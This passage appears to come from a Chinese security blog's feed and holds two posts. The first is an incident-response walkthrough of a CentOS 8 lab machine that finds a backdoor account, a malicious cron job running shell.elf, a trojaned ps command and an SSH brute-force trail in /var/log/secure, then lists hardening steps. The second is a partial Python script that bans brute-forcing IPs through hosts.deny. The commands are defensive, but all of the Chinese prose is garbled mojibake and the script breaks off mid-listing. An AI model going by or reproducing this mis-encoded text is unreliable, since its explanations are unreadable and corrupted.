ä¸ºåªæœ‰è¿™å°å—å®³é¶æœºï¼Œæ²¡æœ‰å…¥ä¾µé¶æœºï¼Œæ‰€ä»¥è¿™é‡Œå¹¶ä¸å­˜åœ¨é¶æœºä¸æ”»å‡»æœºå»ºç«‹çš„ç«¯å£è¿æ¥ã€‚å¦‚æœæœ‰è¿æ¥çš„è¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>kill</code> å‘½ä»¤åˆ‡æ–­ç«¯å£è¿æ¥ï¼Œè¿˜å¯ä»¥ç”¨ <code>lsof -p &lt;PID&gt;</code> æŸ¥çœ‹åˆ°ç«¯å£è¿æ¥çš„è¿›ç¨‹åº”ç”¨ç¨‹åºï¼Œå¯¹æ¶æ„ç¨‹åºè¿›è¡Œå–è¯ã€‚</p><h3 id="2ã€åé—¨ç”¨æˆ·æ’æŸ¥"><a href="#2ã€åé—¨ç”¨æˆ·æ’æŸ¥" class="headerlink" title="2ã€åé—¨ç”¨æˆ·æ’æŸ¥"></a>2ã€åé—¨ç”¨æˆ·æ’æŸ¥</h3><p>å…ˆé€šè¿‡<code>who</code>å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹å½“å‰é¶æœºä¸Šç™»é™†çš„ç”¨æˆ·<img src="/img/Emergency-Centos8/image-20240127135323093.png" alt="image-20240127135323093"></p><p>åªæœ‰tty æœ¬åœ°ç™»é™†çš„çš„zyr ç”¨æˆ·ï¼Œç¡®è®¤å¹¶æ— ä»–äººåœ¨ç™»é™†è¯¥æœºå™¨ã€‚</p><p>ç®€å•çš„çœ‹ä¸€ä¸‹ <code>/etc/passwd</code> æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">awk -F: &#x27;$3==0 &#123;print$1&#125;&#x27; /etc/passwd#æŸ¥çœ‹uidæƒé™ä¸º0çš„ç‰¹æƒç”¨æˆ·</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127135642183.png" alt="image-20240127135642183"></p><p>å‘ç°é™¤äº†rootä¹‹å¤–è¿˜æœ‰ä¸€ä¸ª wxiaoge çš„ç‰¹æƒç”¨æˆ·ï¼Œæˆ‘ä»¬å†çœ‹ä¸€ä¸‹<code>/etc/shadow</code>æ–‡ä»¶ä¸­èƒ½æ­£å¸¸ç™»é™†çš„ç”¨æˆ·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127140522749.png" alt="image-20240127140522749"></p><p>å¯ä»¥çœ‹åˆ°wxiaoge è¿™ä¸ªç”¨æˆ·ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸ç™»å½•çš„ã€‚ä¸€èˆ¬è¿™ä¸ªæ—¶å€™éœ€è¦ä¸å®¢æˆ·è¿›è¡Œæ²Ÿé€šï¼Œç¡®è®¤wxiaoge æ˜¯æ¶æ„ç”¨æˆ·ã€‚</p><p>ç¡®è®¤wxiaoge æ˜¯æ¶æ„ç”¨æˆ·ä¹‹åï¼Œæˆ‘ä»¬å¯¹è¯¥ç”¨æˆ·è¿›è¡Œå°ç¦ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -L wxiaoge &amp;&amp; sudo usermod -s /sbin/nologin username</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127141234111.png" alt="image-20240127141234111"></p><p>ä¹Ÿå¯ä»¥å¯¹è¯¥ç”¨æˆ·è¿›è¡Œåˆ é™¤ï¼Œç›´æ¥ç¼–è¾‘ <code>passwd å’Œ shadow</code>æ–‡ä»¶å³å¯ã€‚</p><h3 id="3ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥"><a href="#3ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥" class="headerlink" title="3ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥"></a>3ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥</h3><p>å°‘äº†å†å²å‘½ä»¤æ’æŸ¥ï¼Œä½†æ˜¯æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹<code>history</code>å’Œæ™®é€šç”¨æˆ·å®¶ç›®å½•ä¸‹çš„ <code>.bash_history</code>å¯ä»¥å‘ç°ï¼Œå†å²å‘½ä»¤éƒ½å·²ç»è¢«æ¸…ç©ºï¼ŒåŒæ—¶wxiaoge å¹¶æ— å®¶ç›®å½•ï¼Œåªèƒ½ä½œç½¢ã€‚</p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹è®¡åˆ’ä»»åŠ¡åˆ—è¡¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127142109610.png" alt="image-20240127142109610"></p><p>å¯ä»¥çœ‹åˆ°æ™®é€šç”¨æˆ·zyr å¹¶æ²¡æœ‰è®¡åˆ’ä»»åŠ¡ï¼Œè€Œroot ç”¨æˆ·å­˜åœ¨ä¸€ä¸ªæ¯åˆ†æ¯ç§’éƒ½ä¼šå»è¿è¡Œçš„ .elf æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„åç§°ä¹Ÿéå¸¸é†’ç›®ï¼Œå¤§æ¦‚ç‡æ˜¯æ¶æ„æ–‡ä»¶ã€‚</p><p><img src="/img/Emergency-Centos8/image-20240127142313290.png" alt="image-20240127142313290"></p><p>å…ˆç®€å•çš„çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶çš„ä¿¡æ¯ï¼Œæ˜¯ä¸€ä¸ª755çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p><img src="/img/Emergency-Centos8/image-20240127143425348.png" alt="image-20240127143425348"></p><p>å¯ä»¥å°†æ­¤æ–‡ä»¶æ”¾åœ¨<code>æ²™ç®±</code>ä¸­è¿›è¡Œæ’æŸ¥ï¼Œç¡®è®¤æ˜¯æ¶æ„æ–‡ä»¶ã€‚ä¿ç•™å–è¯ï¼ŒåæœŸå¯ä»¥åœ¨å®‰å…¨çš„ç¯å¢ƒä¸‹è¯•ç€è¿è¡Œæ­¤æ¶æ„æ–‡ä»¶ï¼Œè§‚å¯Ÿç½‘ç»œç¯å¢ƒç­‰è¿›è¡Œæº¯æºã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨<code>crontab -e</code>å¯¹è®¡åˆ’ä»»åŠ¡è¿›è¡Œç¼–è¾‘ï¼Œæˆ–è€…ä½¿ç”¨<code>crontab -r</code>åˆ é™¤æ‰€æœ‰ç”¨æˆ·è®¡åˆ’ä»»åŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>åˆ é™¤æ¶æ„çš„è®¡åˆ’ä»»åŠ¡ã€‚</p><p><img src="/img/Emergency-Centos8/image-20240127143118099.png" alt="image-20240127143118099"></p><h3 id="4ã€å‘½ä»¤æ›¿æ¢æ’æŸ¥"><a href="#4ã€å‘½ä»¤æ›¿æ¢æ’æŸ¥" class="headerlink" title="4ã€å‘½ä»¤æ›¿æ¢æ’æŸ¥"></a>4ã€å‘½ä»¤æ›¿æ¢æ’æŸ¥</h3><p>æˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸‹ç¯å¢ƒå˜é‡çš„è·¯å¾„éƒ½æœ‰å“ªäº›</p><p><img src="/img/Emergency-Centos8/image-20240127143645212.png" alt="image-20240127143645212"></p><p>ç„¶åé‡‡ç”¨<code>rpm </code>å‘½ä»¤é€ä¸ªæ’æŸ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpm -Vf /sbin/*</span><br><span class="line"></span><br><span class="line">#S å…³é”®å­—ä»£è¡¨æ–‡ä»¶å¤§å°å‘ç”Ÿäº†å˜åŒ–</span><br><span class="line">#5 å…³é”®å­—ä»£è¡¨æ–‡ä»¶çš„ md5 å€¼å‘ç”Ÿäº†å˜åŒ–</span><br><span class="line">#T ä»£è¡¨æ–‡ä»¶æ—¶é—´å‘ç”Ÿäº†å˜åŒ–</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127144154476.png" alt="image-20240127144154476"></p><p><img src="/img/Emergency-Centos8/image-20240127144219519.png" alt="image-20240127144219519"></p><p>ä¸€äº›å…¶ä»–æ–‡ä»¶æ”¹å˜çš„è¯æ˜¯æ— å¯åšéçš„ï¼Œä¸»è¦æŸ¥çœ‹ä¸€äº›å…³é”®æ€§å‘½ä»¤çš„æ”¹å˜ã€‚</p><p>pså‘½ä»¤ç–‘ä¼¼è¢«æ”¹å˜ã€‚è¯•ç€æŸ¥çœ‹ä¸€ä¸‹pså‘½ä»¤çš„å†…å®¹ï¼š<img src="/img/Emergency-Centos8/image-20240127144528505.png" alt="image-20240127144528505"></p><p>åªæœ‰ä¸€è¡Œå‘½ä»¤ï¼Œè¿˜æ˜¯å¾ˆå¥½è§£é‡Šçš„ï¼Œå»æ‰§è¡Œäº†ä¸€ä¸ª .elf æ–‡ä»¶ å’Œ ä¸€ä¸ªéšè—æ–‡ä»¶ä¸‹çš„ps å‘½ä»¤å¹¶è¿›è¡Œäº†è¿‡æ»¤ã€‚</p><p>å°†è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨æ²™ç®±ä¸­è¿›è¡Œæ’æŸ¥ï¼Œ.elf æ˜¯åé—¨æ–‡ä»¶ï¼Œè¿›è¡Œå–è¯åæœŸæº¯æºï¼Œè€Œps æ˜¯æ— æ¯’æ–‡ä»¶ã€‚</p><p>è¯•ç€æ‰§è¡Œè¯¥éšè—çš„psæ–‡ä»¶ã€‚æ˜¯è¢«éšè—èµ·æ¥çš„æ­£å¸¸çš„psæ–‡ä»¶<img src="/img/Emergency-Centos8/image-20240127145306386.png" alt="image-20240127145306386"></p><p>å°†å…¶æ¢å¤åŸä½ï¼Œå¹¶å°†æ¶æ„çš„psæ€æ‰</p><p><img src="/img/Emergency-Centos8/image-20240127145456777.png" alt="image-20240127145456777"></p><h3 id="5ã€æ€»ç»“"><a href="#5ã€æ€»ç»“" class="headerlink" title="5ã€æ€»ç»“"></a>5ã€æ€»ç»“</h3><p>1ã€åé—¨æ–‡ä»¶ ï¼š&#x2F;root&#x2F;shell.elf ã€&#x2F;centos_core.elf<br>2ã€åé—¨è´¦æˆ·ï¼šwxiaoge<br>3ã€æ‰¾åˆ°æ¶æ„å®šæ—¶ä»»åŠ¡<br>4ã€pså‘½ä»¤è¢«æ›¿ç•™pså‘½ä»¤åé—¨</p><h1 id="ä¸‰ã€æº¯æºåŠ å›º"><a href="#ä¸‰ã€æº¯æºåŠ å›º" class="headerlink" title="ä¸‰ã€æº¯æºåŠ å›º"></a>ä¸‰ã€æº¯æºåŠ å›º</h1><h3 id="1ã€æŸ¥çœ‹å…¥ä¾µé€”å¾„"><a href="#1ã€æŸ¥çœ‹å…¥ä¾µé€”å¾„" class="headerlink" title="1ã€æŸ¥çœ‹å…¥ä¾µé€”å¾„"></a>1ã€æŸ¥çœ‹å…¥ä¾µé€”å¾„</h3><p>çœ‹ä¸€ä¸‹å¼€æ”¾ç«¯å£</p><p><img src="/img/Emergency-Centos8/image-20240127151217562.png" alt="image-20240127151217562"></p><p>æ­¤æ—¶è¯¥æœºå™¨å¤„äºå…³é—­çŠ¶æ€ï¼Œå¹¶æ²¡æœ‰æœ‰ç”¨çš„ç«¯å£å¼€æ”¾ã€‚æ£€æŸ¥ç”¨æˆ·ç™»é™†æ—¥å¿—<code>/var/log/secure</code></p><p><img src="/img/Emergency-Centos8/image-20240127152050666.png" alt="image-20240127152050666"></p><p>ä¾æ®è¯¥æ–‡ä»¶å¤§å°ï¼Œæ˜¯å­˜åœ¨å¤§é‡æ—¥å¿—çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure | grep password#ç®€å•è¿‡æ»¤æŸ¥çœ‹ä¸€ä¸‹</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127152226439.png" alt="image-20240127152226439"></p><p>å­˜åœ¨æˆåŠŸæ—¥å¿—ï¼ŒæŒ‡å‘ 192.168.226.1 è¿™ä¸ªIPï¼Œè€Œæˆ‘æœ¬æœºçš„IPæ˜¯192.168.122.1</p><p>å¯¹ç™»é™†æˆåŠŸçš„IPè¿›è¡Œæ’åºç»Ÿè®¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat secure | grep &quot;Accepted password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127152726462.png" alt="image-20240127152726462"></p><p>è¯¥IPæœ‰5æ¬¡æˆåŠŸç™»é™†æ¬¡æ•°ï¼Œ878 æ¬¡å¤±è´¥ç™»é™†æ¬¡æ•°ã€‚</p><p>å†æŸ¥çœ‹ä¸€ä¸‹çˆ†ç ´çš„æ—¶é—´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted password for root&quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127153202604.png" alt="image-20240127153202604"></p><p><img src="/img/Emergency-Centos8/image-20240127153223482.png" alt="image-20240127153223482"></p><p>å¯ä»¥çœ‹åˆ° 192.168.226.1 è¿™ä¸ªIPä»21:51:32 å¼€å§‹çˆ†ç ´åˆ°21:58:31 ä¸€ç›´å¤„äºçˆ†ç ´çŠ¶æ€ï¼Œ21:57:56çˆ†ç ´æˆåŠŸã€‚</p><h3 id="2ã€æ”»å‡»è·¯å¾„è¿˜åŸ"><a href="#2ã€æ”»å‡»è·¯å¾„è¿˜åŸ" class="headerlink" title="2ã€æ”»å‡»è·¯å¾„è¿˜åŸ"></a>2ã€æ”»å‡»è·¯å¾„è¿˜åŸ</h3><p>1ã€192.168.226.1 åœ¨21:57:56çˆ†ç ´æˆåŠŸï¼Œ22:00:27ç™»é™†é¶æœºï¼Œä¹‹åæ ¹æ®å…¥ä¾µæ’æŸ¥å‡ºæ¥çš„ä¸œè¥¿è¿›è¡Œè¿˜åŸã€‚</p><p>2ã€shell.elf åœ¨00:51:12çš„æ—¶å€™è¿›è¡Œäº†æŠ•æ”¾</p><p><img src="/img/Emergency-Centos8/image-20240127153702528.png" alt="image-20240127153702528"></p><p>3ã€è®¡åˆ’ä»»åŠ¡åœ¨ 01:05:53 çš„æ—¶å€™å»ºç«‹</p><p><img src="/img/Emergency-Centos8/image-20240127154108391.png" alt="image-20240127154108391"></p><p>4ã€centos_core.elf åœ¨00:57:03 çš„æ—¶å€™æŠ•æ”¾</p><p><img src="/img/Emergency-Centos8/image-20240127154226236.png" alt="image-20240127154226236"></p><p>5ã€psæ–‡ä»¶åœ¨ 00:59:45 è¿›è¡Œäº†æ”¹åŠ¨</p><p><img src="/img/Emergency-Centos8/image-20240127154418317.png" alt="image-20240127154418317"></p><p>6ã€åé—¨ç”¨æˆ·wxiaoge  åœ¨22:01:18çš„æ—¶å€™åˆ›å»º</p><p><img src="/img/Emergency-Centos8/image-20240127154614968.png" alt="image-20240127154614968"></p><p>æ”»å‡»æµç¨‹æ€»ç»“ï¼š192.168.226.1 åœ¨1æœˆ13æ—¥ 21:57:56é€šè¿‡sshçˆ†ç ´æˆåŠŸï¼Œ22:00:27ç™»é™†é¶æœºï¼Œ22:01:18åˆ›å»ºåé—¨ç”¨æˆ·wxiaogeã€00:51:12 ä¸Šä¼ shell.elfã€00:57:03ä¸Šä¼ centos_core.elfã€00:59:45 ä¸Šä¼ æ¶æ„psæ–‡ä»¶å¹¶æ”¹åŠ¨æ­£ç¡®çš„psæ–‡ä»¶ã€01:05:53 å»ºç«‹è®¡åˆ’ä»»åŠ¡ã€‚</p><h3 id="3ã€ç³»ç»ŸåŠ å›º"><a href="#3ã€ç³»ç»ŸåŠ å›º" class="headerlink" title="3ã€ç³»ç»ŸåŠ å›º"></a>3ã€ç³»ç»ŸåŠ å›º</h3><p>åŠ å›ºçš„åœ°æ–¹æœ‰å¾ˆå¤šï¼Œåœ¨è¿™é‡Œåªåˆ—å‡ºéƒ¨åˆ†ç”¨æˆ·åŠ å›ºã€‚</p><p>1ã€ä¿®æ”¹rootç”¨æˆ·å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127162800354.png" alt="image-20240127162800354"></p><p>2ã€åˆ é™¤ä¸å¿…è¦çš„ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo userdel -r &lt;ç”¨æˆ·å&gt;</span><br></pre></td></tr></table></figure><p>3ã€æ£€æµ‹ç©ºå£ä»¤ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;$2==&quot;!!&quot; &#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">ç„¶åå¯¹æ¯”/etc/passwd çš„å¯ç™»å½•ç”¨æˆ·</span><br><span class="line">passwd &lt;ç”¨æˆ·å&gt;   #ç»™ç”¨æˆ·ä¿®æ”¹å¯†ç </span><br></pre></td></tr></table></figure><p>4ã€å£ä»¤é…ç½®æ–‡ä»¶</p><p>&#x2F;etc&#x2F;pam.d&#x2F;system-auth </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">password requisite pam_cracklib.so retry=3 difok=3 minlen=10#æ–‡ä»¶ä¿®æ”¹æœ€å°é•¿åº¦</span><br><span class="line"></span><br><span class="line">auth required  pam_tally2.so onerr=fail deny=3 unlock_time=300#é”™è¯¯æ¬¡æ•°è¶…è¿‡3æ¬¡è¿›è¡Œé”å®šã€‚è¦å†™åœ¨auth çš„æœ€ä¸Šé¢</span><br><span class="line"></span><br><span class="line">authconfig --passminlen=8 --passminclass=3 --update#passminlenå¯†ç é•¿åº¦ï¼Œpassminclasså¯†ç ç§ç±»ï¼šæ•°å­—ï¼Œå­—æ¯ï¼Œç‰¹æ®Šå­—ç¬¦ä¸‰é¡¹</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥ä¾µæ’æŸ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Pythonæ­¦å™¨åº“ã€‘é˜²SSHçˆ†ç ´è‡ªåŠ¨å°ç¦IPè„šæœ¬</title>
      <link href="/2024/02/14/Python-ssh-IPBan-Script/"/>
      <url>/2024/02/14/Python-ssh-IPBan-Script/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Pythonæ­¦å™¨åº“ã€‘é˜²SSHçˆ†ç ´è‡ªåŠ¨å°ç¦IPè„šæœ¬"><a href="#ã€Pythonæ­¦å™¨åº“ã€‘é˜²SSHçˆ†ç ´è‡ªåŠ¨å°ç¦IPè„šæœ¬" class="headerlink" title="ã€Pythonæ­¦å™¨åº“ã€‘é˜²SSHçˆ†ç ´è‡ªåŠ¨å°ç¦IPè„šæœ¬"></a>ã€Pythonæ­¦å™¨åº“ã€‘é˜²SSHçˆ†ç ´è‡ªåŠ¨å°ç¦IPè„šæœ¬</h1><h2 id="ä¸€ã€ç›¸å…³çŸ¥è¯†"><a href="#ä¸€ã€ç›¸å…³çŸ¥è¯†" class="headerlink" title="ä¸€ã€ç›¸å…³çŸ¥è¯†"></a>ä¸€ã€ç›¸å…³çŸ¥è¯†</h2><h3 id="1ã€sshçˆ†ç ´åçš„ç—•è¿¹æ®‹ç•™"><a href="#1ã€sshçˆ†ç ´åçš„ç—•è¿¹æ®‹ç•™" class="headerlink" title="1ã€sshçˆ†ç ´åçš„ç—•è¿¹æ®‹ç•™"></a>1ã€sshçˆ†ç ´åçš„ç—•è¿¹æ®‹ç•™</h3><p>æˆ‘ä»¬å¯ä»¥åœ¨Centosç³»ç»Ÿçš„ &#x2F;var&#x2F;log&#x2F;secureï¼ˆDebian æ˜¯&#x2F;var&#x2F;log&#x2F;auth.logæ–‡ä»¶ï¼‰ æ–‡ä»¶ä¸­çœ‹åˆ°æœ‰å…³ssh çš„ç™»é™†ä¿¡æ¯ï¼Œå…±æœ‰å¦‚ä¸‹ä¸‰ç§æƒ…å†µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç™»é™†æˆåŠŸï¼šAccepted password for root from 192.168.44.1 port 50854 ssh2</span><br><span class="line">ç™»é™†å¤±è´¥ï¼šFailed password for root from 192.168.44.1 port 50854 ssh2</span><br><span class="line">ç”¨æˆ·ä¸å­˜åœ¨ï¼šInvalid user test from 192.168.31.50 port 54169</span><br></pre></td></tr></table></figure><h3 id="2ã€å¦‚ä½•å°ç¦IP"><a href="#2ã€å¦‚ä½•å°ç¦IP" class="headerlink" title="2ã€å¦‚ä½•å°ç¦IP"></a>2ã€å¦‚ä½•å°ç¦IP</h3><p>æœ‰å…³IPå°ç¦çš„é»‘ç™½åå•æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IPé»‘åå•ï¼š/etc/hosts.deny</span><br><span class="line">IPç™½åå•ï¼š/etc/hosts.allow</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sshd:192.168.31.50#å°ç¦192.168.31.50è¿™ä¸ªIPçš„sshdæœåŠ¡</span><br><span class="line">all:192.168.31.50#å°ç¦192.168.31.50è¿™ä¸ªIPçš„æ‰€æœ‰æœåŠ¡</span><br></pre></td></tr></table></figure><h2 id="äºŒã€Pythoné˜²SSHçˆ†ç ´è„šæœ¬"><a href="#äºŒã€Pythoné˜²SSHçˆ†ç ´è„šæœ¬" class="headerlink" title="äºŒã€Pythoné˜²SSHçˆ†ç ´è„šæœ¬"></a>äºŒã€Pythoné˜²SSHçˆ†ç ´è„šæœ¬</h2><p>1ã€ä»¥ä¸‹çš†ä»¥Centosç³»ç»Ÿä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¤šè¿›ç¨‹å®æ—¶ç›‘æ§&#x2F; var&#x2F;log&#x2F;secure </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è¯»å–å®‰å…¨æ—¥å¿—</span><br><span class="line">popen = subprocess.Popen(&#x27;tail -f &#x27; + logFile, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"># å¼€å§‹ç›‘æ§</span><br><span class="line">while True:</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    line = popen.stdout.readline().strip()</span><br><span class="line">    if line:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>2ã€é‡åˆ°ä¸å­˜åœ¨çš„ç”¨æˆ·å°è¯•ç™»é™†çš„æ—¶å€™ç›´æ¥å°IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">abnormal_invalid_user = re.search(&#x27;Invalid user \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;, str(line))</span><br><span class="line">abnormal_failed_password = re.search(&#x27;Failed password for \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;, str(line))</span><br><span class="line">if abnormal_invalid_user and not denyDict.get(abnormal_invalid_user.group(1)):</span><br><span class="line">subprocess.getoutput(&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;.format(abnormal_invalid_user.group(1), hostDeny))</span><br><span class="line">denyDict[abnormal_invalid_user.group(1)] = time.time()</span><br><span class="line">time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">print(&#x27;&#123;&#125; --- ip:&#123;&#125; å› ä¸ºç™»é™†é”™è¯¯ç”¨æˆ·å è¢«æ‹‰å…¥é»‘åå•&#x27;.format(time_str, abnormal_invalid_user.group(1)))</span><br></pre></td></tr></table></figure><p>3ã€é‡åˆ°æ­£ç¡®çš„ç”¨æˆ·çš„åï¼Œä½†æ˜¯å¯†ç å¤±è´¥æ¬¡æ•°è¶…è¿‡ä¸Šé™å°IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">elif abnormal_failed_password:</span><br><span class="line">ip = abnormal_failed_password.group(1)</span><br><span class="line">tempIP[ip] = tempIP.get(ip, 0) + 1</span><br><span class="line">if tempIP[ip] &gt; password_wrong_num and not denyDict.get(ip):</span><br><span class="line">subprocess.getoutput(&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;.format(ip, hostDeny))</span><br><span class="line">denyDict[ip] = time.time()</span><br><span class="line">time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">print(&#x27;&#123;&#125; --- ip:&#123;&#125; å› ä¸ºå¯†ç é”™è¯¯æ¬¡æ•°è¶…è¿‡ä¸Šé™ è¢«æ‹‰å…¥é»‘åå•&#x27;.format(time_str, ip))</span><br></pre></td></tr></table></figure><p>4ã€æ£€æŸ¥è§£å°ï¼Œè¾¾åˆ°é™åˆ¶çš„æ—¶é—´ä¹‹åè§£å°IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># æ£€æŸ¥é»‘åå•ä¸­çš„IPåœ°å€æ˜¯å¦è¶…è¿‡è§£å°æ—¶é—´ï¼Œè‹¥è¶…è¿‡åˆ™è§£å°</span><br><span class="line">end_time = time.time()</span><br><span class="line">for ip, start_time in list(denyDict.items()):  # ä½¿ç”¨list()å°†å­—å…¸é¡¹è½¬æ¢ä¸ºåˆ—è¡¨é¡¹ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹å­—å…¸å¤§å°</span><br><span class="line">    if end_time - start_time &gt; unblock_time:</span><br><span class="line">        subprocess.getoutput(&#x27;sed -i &quot;/^sshd:&#123;&#125;/d&quot; &#123;&#125;&#x27;.format(ip, hostDeny))</span><br><span class="line">        denyDict.pop(ip)  # ä½¿ç”¨ pop() æ–¹æ³•ä»å­—å…¸ä¸­å½»åº•åˆ é™¤æŒ‡å®šé”®å€¼å¯¹</span><br><span class="line">        time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">        print(&#x27;&#123;&#125; --- ip:&#123;&#125; å·²ä»é»‘åå•ä¸­è§£å°&#x27;.format(time_str, ip))</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€å®Œæ•´è„šæœ¬ä»£ç "><a href="#ä¸‰ã€å®Œæ•´è„šæœ¬ä»£ç " class="headerlink" title="ä¸‰ã€å®Œæ•´è„šæœ¬ä»£ç "></a>ä¸‰ã€å®Œæ•´è„šæœ¬ä»£ç </h2><p>å¦‚ä¸‹violate_blastIP.py è„šæœ¬ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 